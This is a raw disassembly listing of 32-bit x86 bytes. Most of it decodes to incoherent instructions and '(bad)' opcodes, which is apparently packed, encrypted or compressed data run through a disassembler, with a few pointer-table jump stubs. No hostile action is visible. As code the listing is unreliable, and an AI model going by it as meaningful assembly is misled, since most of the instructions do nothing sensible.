  412e7c:	ret    0xd21c
  412e7f:	push   eax
  412e80:	or     dl,ch
  412e82:	scas   eax,DWORD PTR es:[edi]
  412e83:	(bad)  
  412e84:	dec    esi
  412e85:	xchg   ecx,eax
  412e86:	pop    ebx
  412e87:	and    BYTE PTR [edx-0x1b2f8d33],ah
  412e8d:	in     eax,dx
  412e8e:	mov    edi,0x6b98e1df
  412e93:	xor    esp,DWORD PTR [ebx+0x68]
  412e96:	into   
  412e97:	ret    0xfe08
  412e9a:	and    BYTE PTR [ebx-0x68],0xe9
  412e9e:	dec    ebp
  412e9f:	std    
  412ea0:	push   ebx
  412ea1:	nop
  412ea2:	bound  ebp,QWORD PTR [ecx+0x4d]
  412ea5:	es ret 
  412ea7:	add    ch,dl
  412ea9:	nop
  412eaa:	jno    0x412e48
  412eac:	xor    al,0xce
  412eae:	jbe    0x412e9d
  412eb0:	sbb    eax,0x7a52383d
  412eb5:	mov    ah,0xde
  412eb7:	pop    ebp
  412eb8:	sub    eax,0xc0ee7141
  412ebd:	or     eax,0xf2ed479f
  412ec2:	jle    0x412f1b
  412ec4:	push   0x5d
  412ec6:	and    eax,DWORD PTR [edi]
  412ec8:	dec    ebx
  412ec9:	div    DWORD PTR [ebx+0x4994b7e7]
  412ecf:	rcr    DWORD PTR es:[ecx],1
  412ed2:	dec    esi
  412ed3:	mov    cl,0xf8
  412ed5:	scas   al,BYTE PTR es:[edi]
  412ed6:	sbb    al,0xc2
  412ed8:	sar    BYTE PTR [esi+0x78],cl
  412edb:	test   al,0xb
  412edd:	mov    DWORD PTR [ebx],edi
  412edf:	cdq    
  412ee0:	test   DWORD PTR cs:[ebx+esi*8-0x54],esi
  412ee5:	xchg   edi,eax
  412ee6:	loop   0x412f2f
  412ee8:	sub    ebp,edi
  412eea:	xchg   esi,eax
  412eeb:	cmp    BYTE PTR [esi],0xbf
  412eee:	iret   
  412eef:	int    0x97
  412ef1:	adc    DWORD PTR [edi-0x73],ebp
  412ef4:	es cmp ch,dl
  412ef7:	sbb    eax,0x67f1984
  412efc:	imul   edx,DWORD PTR [esp+ecx*1],0xff92ca7f
  412f03:	out    dx,eax
  412f04:	enter  0x7056,0x5b
  412f08:	mov    ds:0x17b181f3,eax
  412f0d:	mov    ds:0xb0816bf3,al
  412f12:	push   0x27
  412f14:	(bad)  
  412f15:	xchg   edx,eax
  412f16:	imul   ecx,DWORD PTR [eax-0x3d0b7952],0xc6f851dd
  412f20:	jo     0x412f46
  412f22:	xor    edi,edx
  412f24:	js     0x412f3e
  412f26:	mov    edi,0x605cbbfa
  412f2b:	mov    BYTE PTR [esp+edx*2-0x2cb45db8],dh
  412f32:	pop    ebx
  412f33:	mov    esi,0x5be149e4
  412f38:	xchg   BYTE PTR [edx],dh
  412f3a:	push   es
  412f3b:	push   ds
  412f3c:	push   esi
  412f3d:	push   ebx
  412f3e:	jno    0x412f3a
  412f40:	pop    ebx
  412f41:	js     0x412ee6
  412f43:	cmp    al,0x77
  412f45:	cld    
  412f46:	test   al,0x72
  412f48:	dec    edx
  412f49:	scas   eax,DWORD PTR es:[edi]
  412f4a:	xchg   ah,dh
  412f4c:	cdq    
  412f4d:	lock pusha 
  412f4f:	mov    ds:0xb8e59825,eax
  412f54:	dec    ebp
  412f55:	(bad)  
  412f56:	jmp    0x7c93:0xbb64bed0
  412f5d:	cmp    DWORD PTR [edx+0x1f],edi
  412f60:	and    esi,DWORD PTR [ebx-0x2773dbe]
  412f66:	imul   eax,DWORD PTR [edi+0x73],0xf910cf0e
  412f6d:	push   0xffffff83
  412f6f:	pop    eax
  412f70:	inc    eax
  412f71:	jae    0x412f99
  412f73:	(bad)  
  412f74:	gs sti 
  412f76:	mov    bl,0x13
  412f78:	add    eax,0xa3dc007b
  412f7d:	pusha  
  412f7e:	cmp    al,0x9a
  412f80:	cmc    
  412f81:	fsub   st,st(6)
  412f83:	or     eax,DWORD PTR [ecx]
  412f85:	dec    DWORD PTR [eax-0x54afd55b]
  412f8b:	and    al,0xff
  412f8d:	jmp    0x412fa5
  412f8f:	pop    esp
  412f90:	mov    eax,0xeb66e56a
  412f95:	out    0xbe,eax
  412f97:	bound  ebp,QWORD PTR [ecx-0x5f]
  412f9a:	fdivr  QWORD PTR [edx-0x4e]
  412f9d:	retf   0x89e
  412fa0:	loope  0x412fd1
  412fa2:	out    0xf7,eax
  412fa4:	jno    0x412ff3
  412fa6:	jne    0x412f61
  412fa8:	pop    ecx
  412fa9:	pop    es
  412faa:	xchg   ecx,eax
  412fab:	loope  0x412f89
  412fad:	and    eax,0x99ef94fc
  412fb2:	(bad)  
  412fb3:	jp     0x412fff
  412fb5:	or     dh,BYTE PTR [ebx+0x1f]
  412fb8:	xchg   ebp,eax
  412fb9:	cmp    ch,BYTE PTR [ecx+0x7d]
  412fbc:	idiv   BYTE PTR [edx-0x2709598d]
  412fc2:	sub    edx,DWORD PTR [eax]
  412fc4:	dec    edi
  412fc5:	sbb    eax,0x671aab85
  412fca:	dec    ecx
  412fcb:	mov    eax,ds:0x426b9e
  412fd0:	mov    eax,DWORD PTR [eax]
  412fd2:	jmp    0x4134dd
  412fd7:	aas    
  412fd8:	(bad)  
  412fd9:	vpmullw ymm1,ymm6,ymm5
  412fdd:	xlat   BYTE PTR ds:[ebx]
  412fde:	(bad)  
  412fdf:	jne    0x412fff
  412fe1:	fs aas 
  412fe3:	pop    ds
  412fe4:	bound  esi,QWORD PTR [ebx-0x6a]
  412fe7:	or     BYTE PTR [edi+edi*2],cl
  412fea:	js     0x413056
  412fec:	jl     0x413066
  412fee:	js     0x412fa3
  412ff0:	pop    esp
  412ff1:	sub    ch,BYTE PTR [esi-0xbeb6e97]
  412ff7:	pop    ebx
  412ff8:	(bad)  
  412ffa:	mov    ecx,0xf5bb8e74
  412fff:	mov    bh,0x6e
  413001:	sahf   
  413002:	jae    0x41306d
  413004:	pop    ss
  413005:	push   eax
  413006:	aas    
  413007:	(bad)  
  413008:	and    al,0x9e
  41300a:	in     al,dx
  41300b:	lahf   
  41300c:	(bad)  
  41300d:	xor    esp,DWORD PTR [eax+esi*1-0x60b81641]
  413014:	sub    al,0xc3
  413016:	bound  ecx,QWORD PTR [eax]
  413018:	fnstsw WORD PTR [eax]
  41301a:	push   ebp
  41301b:	inc    BYTE PTR [edx+0x47]
  41301e:	cmp    al,0x5b
  413020:	(bad)  
  413021:	jle    0x41304d
  413023:	pop    esi
  413024:	pop    ecx
  413025:	xchg   ebx,eax
  413026:	sahf   
  413027:	in     eax,dx
  413028:	into   
  413029:	adc    al,0xc6
  41302b:	xchg   ebp,eax
  41302c:	push   eax
  41302d:	test   al,0x87
  41302f:	stc    
  413030:	pop    eax
  413031:	daa    
  413032:	mov    ebx,0x160fa7cd
  413037:	jb     0x413072
  413039:	pop    eax
  41303a:	push   ebx
  41303b:	loop   0x41308f
  41303d:	loope  0x413034
  41303f:	fnsave [edi+ebx*2+0x46]
  413043:	xchg   edi,eax
  413044:	ss sub eax,0xff283d8
  41304a:	(bad)  
  41304c:	fimul  DWORD PTR [ebp-0x50b9b001]
  413052:	lock inc ecx
  413054:	sbb    eax,0x790ba328
  413059:	jg     0x412ffc
  41305b:	mov    ebx,0xadf99f0e
  413060:	rol    ebx,1
  413062:	pushf  
  413063:	mov    WORD PTR [esp+ecx*8-0x142752d7],?
  41306a:	add    BYTE PTR ds:0x45b9311,dl
  413070:	fidivr DWORD PTR [esi]
  413072:	jecxz  0x4130e5
  413074:	and    ebx,DWORD PTR [edi+edx*8+0x38]
  413078:	xor    ebp,DWORD PTR [ebx+0x6a426b0]
  41307e:	xor    dl,al
  413080:	push   esi
  413081:	retf   
  413082:	inc    ebp
  413083:	mov    bh,0x2a
  413085:	mov    dl,0x9c
  413087:	xchg   ebp,eax
  413088:	pushf  
  413089:	pop    eax
  41308a:	int3   
  41308b:	mov    eax,ds:0xb2e2d0d3
  413090:	adc    eax,0xc7601a79
  413095:	enter  0x8a46,0x2a
  413099:	jb     0x4130a8
  41309b:	mov    gs,WORD PTR [edx+0x1e3010f8]
  4130a1:	pop    es
  4130a2:	dec    edi
  4130a3:	stos   DWORD PTR es:[edi],eax
  4130a4:	or     eax,0x481c214f
  4130a9:	cmp    DWORD PTR [esi+0x38],ebx
  4130ac:	pop    esi
  4130ad:	mov    ds:0x713d30b7,al
  4130b2:	les    ecx,FWORD PTR [edx+0x38]
  4130b5:	(bad)  
  4130b6:	jnp    0x413093
  4130b8:	ja     0x413090
  4130ba:	add    DWORD PTR [ebp-0x5ddd7a2b],ebp
  4130c0:	cmp    ecx,DWORD PTR [ebp+0x6b]
  4130c3:	mov    ah,0x30
  4130c5:	push   0xd9b87b78
  4130ca:	mov    es,esi
  4130cc:	mov    ebx,0x7438cc79
  4130d1:	inc    edx
  4130d2:	icebp  
  4130d3:	out    dx,al
  4130d4:	cmp    edi,DWORD PTR gs:[eax+0x433a7be7]
  4130db:	stc    
  4130dc:	sub    edx,ebp
  4130de:	cmp    eax,0x7ef8ab6f
  4130e3:	mov    ebp,0x3a7d4d69
  4130e8:	int3   
  4130e9:	arpl   WORD PTR [ebx-0x71],ax
  4130ec:	rol    BYTE PTR [ecx],0x38
  4130ef:	cs push edx
  4130f1:	cs sbb eax,0x83c96f21
  4130f7:	mov    eax,0x1f1221ad
  4130fc:	jo     0x413136
  4130fe:	(bad)  
  4130ff:	cwde   
  413100:	inc    ebp
  413101:	jmp    0x337f2bfb
  413106:	call   0x106:0x24598eb6
  41310d:	mov    esp,0x6d5b7bc7
  413112:	(bad)  
  413114:	fbld   TBYTE PTR [ebx+0x1ed28b2e]
  41311a:	fneni(8087 only) 
  41311c:	icebp  
  41311d:	lahf   
  41311e:	fld    DWORD PTR [esi-0x79ca06ae]
  413124:	mov    dl,0x41
  413126:	stc    
  413127:	adc    ecx,DWORD PTR [edx+0x18]
  41312a:	out    0x43,eax
  41312c:	not    BYTE PTR [di-0x1c12]
  413131:	aas    
  413132:	xchg   esp,eax
  413133:	arpl   sp,bx
  413135:	jbe    0x41315c
  413137:	ret    
  413138:	pop    eax
  413139:	sbb    BYTE PTR [ecx],cl
  41313b:	repnz mov eax,ds:0xe79044dd
  413141:	dec    ebx
  413142:	mov    ebp,0x76f6bef7
  413147:	(bad)  
  413148:	es add ebx,ebx
  41314b:	push   eax
  41314c:	or     al,0x80
  41314e:	or     cl,dh
  413150:	sub    ebp,DWORD PTR [edx-0x74ab130f]
  413156:	sbb    ah,BYTE PTR [ebx+0x62]
  413159:	loope  0x41317e
  41315b:	jp     0x4130e9
  41315d:	or     BYTE PTR [edx+0x275b72dd],0x64
  413164:	sbb    dh,BYTE PTR [edi+eiz*2-0x61389f5c]
  41316b:	push   ebp
  41316c:	push   eax
  41316d:	mov    ds:0x9cbd8d2,al
  413172:	cmp    al,0x7c
  413174:	jge    0x41314d
  413176:	js     0x41319e
  413178:	jnp    0x4131b3
  41317a:	xor    DWORD PTR [ecx+0x7e],ebp
  41317d:	push   ebp
  41317e:	jl     0x413189
  413180:	cld    
  413181:	outs   dx,DWORD PTR ds:[esi]
  413182:	push   ecx
  413183:	push   ds
  413184:	pop    es
  413185:	pop    edi
  413186:	push   edx
  413187:	cmp    al,0xed
  413189:	pop    ss
  41318a:	mov    edx,0xd477cea0
  41318f:	(bad)  
  413190:	push   esi
  413191:	sar    BYTE PTR [ecx-0x37],0x9a
  413195:	mov    ebp,0x52f0ad72
  41319a:	dec    ebx
  41319b:	vaddpd ymm1,ymm3,YMMWORD PTR [ebx+esi*2+0x9]
  4131a1:	popa   
  4131a2:	cmp    ebx,edi
  4131a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131a5:	and    DWORD PTR [edi],edx
  4131a7:	call   0x337dc44a
  4131ac:	xor    eax,0xa49b8d7e
  4131b1:	repnz enter 0x4cb,0xf7
  4131b6:	cmp    dh,BYTE PTR [ebx+0x3c0d46f3]
  4131bc:	daa    
  4131bd:	imul   esi,DWORD PTR [esp+ebx*4+0x61],0x59
  4131c2:	xor    al,0x71
  4131c4:	das    
  4131c5:	icebp  
  4131c6:	inc    edx
  4131c7:	sub    BYTE PTR [ecx],bl
  4131c9:	xchg   DWORD PTR [esi+edi*1-0x11316692],edi
  4131d0:	cmp    BYTE PTR [eax],ch
  4131d2:	sub    ecx,edi
  4131d4:	outs   dx,BYTE PTR ds:[esi]
  4131d5:	loope  0x41321c
  4131d7:	inc    esi
  4131d8:	dec    eax
  4131d9:	pushf  
  4131da:	add    eax,0xd3d131b8
  4131df:	popf   
  4131e0:	inc    edi
  4131e1:	out    dx,eax
  4131e2:	and    edx,ebx
  4131e4:	push   eax
  4131e5:	mov    bh,al
  4131e7:	sbb    ebp,ecx
  4131e9:	pop    edx
  4131ea:	int    0xae
  4131ec:	xchg   esi,eax
  4131ed:	mov    edi,0x9ae1f3c4
  4131f2:	add    esp,DWORD PTR [edx+0x378504a8]
  4131f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131f9:	mov    ecx,0xf19b8ab0
  4131fe:	inc    esp
  4131ff:	dec    esi
  413200:	and    DWORD PTR [edx],ebx
  413202:	xchg   edx,eax
  413203:	shl    DWORD PTR [ebx+edx*4-0x57],cl
  413207:	push   eax
  413208:	pop    esp
  413209:	jmp    0x52da:0x138d5acc
  413210:	jae    0x4131ee
  413212:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413213:	and    BYTE PTR [edx+0x47],al
  413216:	dec    edx
  413217:	xor    eax,0x554af82d
  41321c:	jg     0x413290
  41321e:	pop    ebp
  41321f:	fs cmp al,0xb
  413222:	and    DWORD PTR [ebp-0x4c],edx
  413225:	mov    WORD PTR [eax],ss
  413227:	cdq    
  413228:	adc    DWORD PTR [ecx-0x2],esp
  41322b:	fsub   DWORD PTR [esi+ecx*8-0x75c85d06]
  413232:	mov    edi,0xa2d248c0
  413237:	mov    ecx,0xfc95500
  41323c:	dec    ebx
  41323d:	mov    cl,0xc9
  41323f:	push   ss
  413240:	sub    al,0xc9
  413242:	rol    BYTE PTR [eax+0x42],cl
  413245:	mov    ebx,0x53221914
  41324a:	xor    al,0x36
  41324c:	xor    esp,edi
  41324e:	push   0x8a053036
  413253:	out    dx,al
  413254:	mov    ebp,0xefc2cb44
  413259:	xor    ebp,DWORD PTR fs:[ebp*8+0x6d3bcd05]
  413261:	cwde   
  413262:	or     al,BYTE PTR [esp+ebp*4]
  413265:	or     DWORD PTR [ebp+edi*4+0x44],0x8ba04f28
  41326d:	cdq    
  41326e:	int3   
  41326f:	(bad)
  413272:	outs   dx,BYTE PTR ds:[esi]
  413273:	mov    ds:0xa5c48f64,eax
  413278:	sub    al,0xe4
  41327a:	mov    ecx,0x9a7d5c3a
  41327f:	ror    BYTE PTR ds:0xef9e56ac,cl
  413285:	inc    edi
  413286:	repz rcr BYTE PTR [ebp+0x49],cl
  41328a:	out    dx,eax
  41328b:	adc    edi,DWORD PTR [edx+ebx*4-0x26]
  41328f:	mov    ds:0x304f9c9,al
  413294:	pop    edx
  413295:	loope  0x413284
  413297:	ror    DWORD PTR [eax+0x6c],1
  41329a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41329b:	aad    0x5b
  41329d:	scas   eax,DWORD PTR es:[edi]
  41329e:	ds push ds
  4132a0:	mov    BYTE PTR [edx],dl
  4132a2:	imul   eax,DWORD PTR [esi+0x4a],0x8
  4132a6:	cmp    eax,0x8ce63285
  4132ab:	jge    0x41326a
  4132ad:	or     ah,BYTE PTR [edx]
  4132af:	ficomp WORD PTR [edi]
  4132b1:	je     0x413249
  4132b3:	cwde   
  4132b4:	imul   esi,edi,0x3a
  4132b7:	and    edi,0xffffffed
  4132ba:	mov    ebp,0xccc30737
  4132bf:	jo     0x4132ea
  4132c1:	in     al,0xec
  4132c3:	sbb    ecx,DWORD PTR [edx+0x77]
  4132c6:	dec    eax
  4132c7:	in     eax,0xb9
  4132c9:	pop    ecx
  4132ca:	pusha  
  4132cb:	xor    DWORD PTR [eax-0x2c],0xffffffdf
  4132cf:	ja     0x41332c
  4132d1:	mov    edx,0xabad71ad
  4132d6:	loope  0x413279
  4132d8:	iret   
  4132d9:	(bad)  
  4132da:	sbb    ebx,esi
  4132dc:	adc    bh,BYTE PTR [edi+0x53d03783]
  4132e2:	adc    eax,DWORD PTR [edi+0x45]
  4132e5:	bound  edx,QWORD PTR ds:0x46e2f5c3
  4132eb:	lahf   
  4132ec:	sahf   
  4132ed:	push   ss
  4132ee:	add    al,0xca
  4132f0:	add    BYTE PTR [edx],ah
  4132f2:	cli    
  4132f3:	jp     0x4132b9
  4132f5:	shl    DWORD PTR [esi+0x4d],cl
  4132f8:	or     edi,edx
  4132fa:	xlat   BYTE PTR ds:[ebx]
  4132fb:	shr    BYTE PTR ds:0x57c6e7d7,1
  413301:	outs   dx,DWORD PTR ds:[esi]
  413302:	pushf  
  413303:	popa   
  413304:	dec    edi
  413305:	mov    eax,0x52373be2
  41330a:	adc    eax,0x44b6cd36
  41330f:	mov    al,0xc5
  413311:	sbb    ebp,edx
  413313:	and    DWORD PTR [ebx+edx*4+0x1e],eax
  413317:	jge    0x41332b
  413319:	adc    bh,bh
  41331b:	dec    esp
  41331c:	nop
  41331d:	rol    DWORD PTR [esi+0x2a58c140],cl
  413323:	inc    ecx
  413324:	loopne 0x413344
  413326:	mov    esi,0x324c9360
  41332b:	in     al,dx
  41332c:	sub    eax,0x16db7818
  413331:	or     eax,0x7fe45a22
  413336:	jae    0x41336f
  413338:	jmp    0x2bd74a6b
  41333d:	or     ch,BYTE PTR [edx-0xf721e28]
  413343:	fs pop ebx
  413345:	(bad)  
  413346:	cmp    cl,BYTE PTR [edx]
  413348:	in     eax,0x22
  41334a:	das    
  41334b:	(bad)  
  41334c:	push   eax
  41334d:	adc    edx,DWORD PTR [eax+0x4d9a4466]
  413353:	(bad)  
  413355:	enter  0xa626,0x74
  413359:	iret   
  41335a:	mov    edx,fs
  41335c:	pop    esi
  41335d:	and    bh,dl
  41335f:	push   0xcb86970f
  413364:	retf   0x8dba
  413367:	jge    0x41335c
  413369:	loope  0x413329
  41336b:	shl    DWORD PTR [ebx],1
  41336d:	xor    dl,BYTE PTR [edi+ebp*8-0x76]
  413371:	add    al,0x81
  413373:	sub    BYTE PTR [edx+0x62499992],cl
  413379:	dec    ecx
  41337a:	jbe    0x4132fe
  41337c:	inc    ecx
  41337d:	jl     0x41335d
  41337f:	sbb    DWORD PTR [ebx+0x71],edi
  413382:	sahf   
  413383:	popa   
  413384:	scas   al,BYTE PTR es:[edi]
  413385:	mov    ebx,0x4adebf8
  41338a:	mov    ds:0xbb3c0f58,eax
  41338f:	(bad)  
  413390:	dec    eax
  413391:	idiv   DWORD PTR [eax]
  413393:	cmp    eax,0xf293c8bc
  413398:	nop
  413399:	in     eax,dx
  41339a:	mov    bh,0x48
  41339c:	mov    bl,0xd
  41339e:	pop    eax
  41339f:	punpcklwd mm0,DWORD PTR [edi]
  4133a2:	js     0x41334e
  4133a4:	xlat   BYTE PTR ds:[ebx]
  4133a5:	jmp    0x8d1e8f2f
  4133aa:	cmp    eax,0x610d41a9
  4133af:	inc    esi
  4133b0:	inc    esi
  4133b1:	add    ch,BYTE PTR [eax]
  4133b3:	push   esp
  4133b4:	or     DWORD PTR [edx+0x5d],ecx
  4133b7:	mov    ?,esi
  4133b9:	aam    0x3d
  4133bb:	push   esp
  4133bc:	out    dx,eax
  4133bd:	rol    DWORD PTR [ebx-0x3],cl
  4133c0:	mov    al,ds:0xa01f8be1
  4133c5:	and    al,0x8e
  4133c7:	pop    ds
  4133c8:	and    DWORD PTR [edx+ebx*4],0xffffff9e
  4133cc:	les    edi,FWORD PTR [ebp+ebx*4-0x477e998d]
  4133d3:	jmp    0x9d7e:0x8a4fed06
  4133da:	call   0x666f2d6e
  4133df:	cmp    ebp,edx
  4133e1:	jne    0x41338d
  4133e3:	xchg   ebp,eax
  4133e4:	mov    al,0x84
  4133e6:	sbb    eax,0xeb178d79
  4133eb:	pop    es
  4133ec:	in     al,0x6c
  4133ee:	xlat   BYTE PTR ds:[ebx]
  4133ef:	es dec esi
  4133f1:	repz (bad)
  4133f4:	mov    bh,0x88
  4133f6:	and    DWORD PTR [edx-0x5d6e484f],edi
  4133fc:	(bad)  
  4133fe:	pop    esp
  4133ff:	inc    ecx
  413400:	scas   eax,DWORD PTR es:[edi]
  413401:	pop    ecx
  413402:	shl    DWORD PTR [ecx],1
  413404:	je     0x4133cb
  413406:	xchg   ebx,eax
  413407:	dec    esi
  413408:	adc    eax,0xee4a7791
  41340d:	pusha  
  41340e:	arpl   sp,cx
  413410:	xor    eax,0xe3bf2f78
  413415:	js     0x4133ca
  413417:	retf   0xdd78
  41341a:	fst    DWORD PTR [esi-0x232cbb5a]
  413420:	nop
  413421:	pop    ss
  413422:	push   ebx
  413423:	adc    bl,BYTE PTR [esi-0xea98d44]
  413429:	call   0x9344:0x1bb1bc6
  413430:	add    eax,0x2b4a91f7
  413435:	pop    eax
  413436:	cmp    dh,0x47
  413439:	cld    
  41343a:	aaa    
  41343b:	gs inc eax
  41343d:	fisttp WORD PTR [esi+0x3bed984a]
  413443:	popf   
  413444:	das    
  413445:	stos   BYTE PTR es:[edi],al
  413446:	xchg   esi,eax
  413447:	xchg   edi,eax
  413448:	dec    edi
  413449:	lock data16 add BYTE PTR [ecx+ebp*1],dl
  41344e:	popf   
  41344f:	jl     0x4134c3
  413451:	jb     0x4134b3
  413453:	jbe    0x41346a
  413455:	dec    eax
  413456:	adc    ebx,ecx
  413458:	int    0xd4
  41345a:	call   FWORD PTR [esi+0x4b]
  41345d:	jnp    0x4134b0
  41345f:	lock xchg ebx,eax
  413461:	inc    esi
  413462:	mov    ah,0x46
  413464:	(bad)  
  413465:	test   BYTE PTR [esi],0x62
  413468:	mov    bh,0x56
  41346a:	push   ebp
  41346b:	js     0x413473
  41346d:	in     eax,0xfb
  41346f:	sahf   
  413470:	scas   eax,DWORD PTR es:[edi]
  413471:	push   eax
  413472:	std    
  413473:	(bad)  
  413474:	sbb    DWORD PTR [ecx-0x717c85d9],eax
  41347a:	or     eax,DWORD PTR ds:0x91c932ab
  413480:	sar    BYTE PTR [ecx],0x34
  413483:	cli    
  413484:	adc    DWORD PTR [ecx-0x543e64b5],eax
  41348a:	or     DWORD PTR [ebx-0x1d],eax
  41348d:	mov    ecx,edx
  41348f:	jae    0x4134fa
  413491:	push   ebp
  413492:	int    0x2b
  413494:	or     al,0x24
  413496:	imul   dh
  413498:	outs   dx,DWORD PTR ds:[esi]
  413499:	adc    ch,ch
  41349b:	cdq    
  41349c:	fidiv  WORD PTR [ebx+0xbd82252]
  4134a2:	sbb    DWORD PTR [edi-0x68],esi
  4134a5:	jne    0x4134ee
  4134a7:	and    al,0x26
  4134a9:	aas    
  4134aa:	xor    BYTE PTR [edx+edx*2+0x68],bh
  4134ae:	cmc    
  4134af:	inc    edx
  4134b0:	mov    dh,0xc7
  4134b2:	jae    0x4134ab
  4134b4:	lock cmp cl,bh
  4134b7:	hlt    
  4134b8:	push   es
  4134b9:	mov    al,ds:0x44b0f0c5
  4134be:	int    0x91
  4134c0:	test   eax,0x42d28d62
  4134c5:	pop    esi
  4134c6:	popf   
  4134c7:	pop    ebp
  4134c8:	data16 add cl,BYTE PTR [ebx-0xbd6a3e4]
  4134cf:	sbb    bl,BYTE PTR [ebp-0x43ebf0ee]
  4134d5:	fs dec ebx
  4134d7:	rol    DWORD PTR [esp+ecx*8-0xdf19a0],0x30
  4134df:	lea    eax,ds:0x426bba
  4134e5:	push   DWORD PTR [eax]
  4134e7:	jmp    0x4139f2
  4134ec:	cmp    al,0x3c
  4134ee:	rol    eax,cl
  4134f0:	rcl    edi,cl
  4134f2:	fcmovnb st,st(4)
  4134f4:	mov    DWORD PTR [edx],edx
  4134f6:	inc    edi
  4134f7:	rol    BYTE PTR ds:0x7a3e2834,1
  4134fd:	adc    BYTE PTR [edi+0x78],bh
  413500:	push   0x7c
  413502:	js     0x41357c
  413504:	and    BYTE PTR [esi+edx*1-0x41],ah
  413508:	in     eax,0xb6
  41350a:	xchg   esi,eax
  41350b:	sub    al,0x7e
  41350d:	jno    0x413518
  41350f:	lods   al,BYTE PTR ds:[esi]
  413510:	push   ss
  413511:	dec    ebx
  413512:	loop   0x413503
  413514:	mov    DWORD PTR [ecx*8+0x1e77ddb2],0x23df217
  41351f:	and    ebx,DWORD PTR [ebp-0x48d0ba75]
  413525:	sub    BYTE PTR [eax+eiz*4+0x75],ch
  413529:	cli    
  41352a:	(bad)  
  41352b:	sbb    ch,cl
  41352d:	clc    
  41352e:	fmul   QWORD PTR [edx-0x6e]
  413531:	xchg   DWORD PTR [eax],esi
  413533:	cs clc 
  413535:	xor    ah,BYTE PTR [ecx]
  413537:	mov    al,0xeb
  413539:	xor    bl,BYTE PTR [eax-0x17ff975b]
  41353f:	sahf   
  413540:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413541:	inc    esi
  413542:	push   esp
  413543:	xchg   edi,eax
  413544:	or     esi,DWORD PTR [esi+0x5c]
  413547:	pushw  ds
  413549:	(bad)  
  41354a:	lock xchg BYTE PTR [edx-0x15],bh
  41354e:	leave  
  41354f:	jne    0x4135ad
  413551:	add    edx,DWORD PTR [ecx-0x4ef9633d]
  413557:	jo     0x41353b
  413559:	fwait
  41355a:	sbb    al,BYTE PTR [ebx]
  41355c:	jne    0x41352a
  41355e:	push   0xe28485bd
  413563:	xchg   DWORD PTR ds:0xb8c93eac,ebx
  413569:	and    bh,ch
  41356b:	or     DWORD PTR [edx-0x71b15b5e],ebx
  413571:	add    eax,0x1a33d2c9
  413576:	and    eax,0xbc290a0f
  41357b:	(bad)  
  41357c:	call   0xb77a098a
  413581:	sub    DWORD PTR [edx-0x60],esp
  413584:	outs   dx,BYTE PTR ds:[esi]
  413585:	enter  0x1c66,0xe9
  413589:	neg    cl
  41358b:	xchg   ecx,eax
  41358c:	fisttp DWORD PTR [ebp+0x4b]
  41358f:	imul   esp,ebx,0x28
  413592:	or     BYTE PTR [edx+esi*4-0x3089a3bf],ah
  413599:	aaa    
  41359a:	cdq    
  41359b:	xchg   ebx,eax
  41359c:	cs inc edx
  41359e:	loopne 0x413559
  4135a0:	adc    esp,DWORD PTR [eax+0x71e5b09a]
  4135a6:	pxor   mm7,mm4
  4135a9:	mov    ah,0xb6
  4135ab:	sub    ch,dh
  4135ad:	lock push edi
  4135af:	mov    ah,0x3b
  4135b1:	jmp    0x95260a33
  4135b6:	inc    esi
  4135b7:	stos   DWORD PTR es:[edi],eax
  4135b8:	adc    ebp,ebx
  4135ba:	je     0x413606
  4135bc:	mov    dl,dh
  4135be:	out    dx,al
  4135bf:	add    bh,bh
  4135c1:	test   al,0x4d
  4135c3:	xchg   ecx,eax
  4135c4:	int3   
  4135c5:	push   ss
  4135c6:	xor    dh,bl
  4135c8:	cmp    DWORD PTR [eax+0x3d],ebp
  4135cb:	sub    DWORD PTR [eax-0x13459e2c],0xa9cd8ef5
  4135d5:	or     eax,0x8cbcad16
  4135da:	xor    DWORD PTR [ecx-0x264d716c],esp
  4135e0:	out    0xa3,al
  4135e2:	jecxz  0x4135bb
  4135e4:	jns    0x4135b2
  4135e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4135e7:	inc    ecx
  4135e8:	pop    ds
  4135e9:	fs jns 0x413608
  4135ec:	xlat   BYTE PTR ds:[ebx]
  4135ed:	outs   dx,BYTE PTR ds:[esi]
  4135ee:	les    eax,FWORD PTR ds:[esi-0x3f86a0bb]
  4135f5:	out    dx,eax
  4135f6:	cmp    eax,0x969df52f
  4135fb:	jp     0x4135a8
  4135fd:	cmp    dl,BYTE PTR [esi]
  4135ff:	xchg   ebx,eax
  413600:	jmp    0x2ad3:0x9dfbd677
  413607:	mov    dl,BYTE PTR [eax+edx*1]
  41360a:	push   es
  41360b:	pop    ecx
  41360c:	fcmovnb st,st(7)
  41360e:	jp     0x413603
  413610:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413611:	fisub  WORD PTR [ebx]
  413613:	aam    0xba
  413615:	fs sbb ah,dl
  413618:	or     DWORD PTR [edi],eax
  41361a:	and    ebx,esi
  41361c:	mov    edi,0x99744179
  413621:	cmp    eax,0xc80d4d6e
  413626:	mov    dh,0x2e
  413628:	push   eax
  413629:	push   ds
  41362a:	je     0x4135c4
  41362c:	in     eax,0x4a
  41362e:	cdq    
  41362f:	sbb    bl,BYTE PTR [ebx-0x35]
  413632:	mov    ss,WORD PTR [eax-0x31]
  413635:	mov    bl,0xe6
  413637:	test   al,0x5e
  413639:	rcr    bl,1
  41363b:	ret    0x399f
  41363e:	mov    ds:0xf926c2a7,eax
  413643:	pop    edx
  413644:	popf   
  413645:	rol    BYTE PTR [esp+edi*2],0x97
  413649:	cmp    BYTE PTR [eax+0x2c62569c],0xb4
  413650:	mov    ecx,0xae93d6da
  413655:	sbb    al,0x1b
  413657:	pop    edi
  413658:	add    DWORD PTR [ebx+0x69933a83],edx
  41365e:	dec    ecx
  41365f:	data16 out 0x90,al
  413662:	mov    edx,0xe3103f6d
  413667:	and    bh,BYTE PTR [eax]
  413669:	cmp    ah,ah
  41366b:	out    dx,eax
  41366c:	mov    ch,0x49
  41366e:	push   ds
  41366f:	(bad)  
  413670:	mul    DWORD PTR [edi]
  413672:	hlt    
  413673:	dec    esp
  413674:	push   ds
  413675:	pop    ebx
  413676:	add    bl,al
  413678:	sbb    al,0xfd
  41367a:	pop    esp
  41367b:	ja     0x413614
  41367d:	mov    BYTE PTR [ecx],ah
  41367f:	fnstsw WORD PTR [esi-0x4deb0a53]
